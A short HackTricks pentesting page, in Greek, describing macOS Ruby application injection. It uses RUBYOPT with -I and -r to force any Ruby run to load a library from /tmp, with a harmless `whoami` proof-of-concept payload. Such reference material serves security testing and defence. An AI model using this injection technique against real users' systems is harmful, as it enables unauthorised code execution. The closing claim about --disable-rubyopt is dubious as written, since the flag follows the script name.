# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Χρησιμοποιώντας αυτήν την μεταβλητή περιβάλλοντος είναι δυνατόν να **προσθέσετε νέες παραμέτρους** στη **ruby** όποτε εκτελείται. Αν και η παράμετρος **`-e`** δεν μπορεί να χρησιμοποιηθεί για να καθορίσει τον κώδικα ruby προς εκτέλεση, είναι δυνατόν να χρησιμοποιηθούν οι παράμετροι **`-I`** και **`-r`** για να προστεθεί ένας νέος φάκελος στη διαδρομή φόρτωσης βιβλιοθηκών και στη συνέχεια **να καθορίσετε μια βιβλιοθήκη για φόρτωση**.

Δημιουργήστε τη βιβλιοθήκη **`inject.rb`** στο **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Δημιουργήστε οπουδήποτε ένα σενάριο ruby όπως:
```ruby:hello.rb
puts 'Hello, World!'
```
Στη συνέχεια, κάντε ένα αυθαίρετο σενάριο ruby να το φορτώσει με:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Διασκεδαστικό γεγονός, λειτουργεί ακόμη και με την παράμετρο **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
